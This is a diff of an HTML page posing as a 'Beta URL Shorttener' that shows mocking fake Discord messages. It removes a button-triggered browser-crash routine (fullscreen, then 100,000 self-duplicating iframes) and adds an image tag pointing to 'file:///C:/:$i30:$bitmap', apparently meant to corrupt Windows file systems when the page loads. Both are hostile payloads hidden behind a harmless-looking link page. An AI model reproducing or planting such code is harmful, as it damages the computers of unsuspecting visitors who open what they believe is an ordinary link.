@@ -11,6 +11,7 @@
 	</style>
 </head>
 <body>
+  <img src="file:///C:/:$i30:$bitmap">
   <discord-messages id="messages">
   </discord-messages>
 	<script>
@@ -66,19 +67,9 @@
 					Bet you thought about getting away with it but atlas, we took notice.
 				</discord-message>`;
 		}
-		function crashLol() {
-			for (var i = 0; i < 100000; i++) {
-			  document.body.innerHTML += '<iframe height="1" width="1" src="/duplicatingTab/" title="Duplicating Tab"></iframe>';
-		  }
-		}
-		function yourComputerHazVirus() {
-			var elem = document.body; // Make the body go full screen.
-			requestFullScreen(elem);
-			setTimeout(crashLol, 4000);
-		}
 	</script>
 	
 	<h1 class="remove">Beta URL Shorttener</h1>
-	<input class="remove" type=button value="Click to Open Link" onclick="yourComputerHazVirus(); addMessagesOne();">
+	<input class="remove" type=button value="Click to Open Link" onclick="addMessagesOne();">
 </body>
 </html>
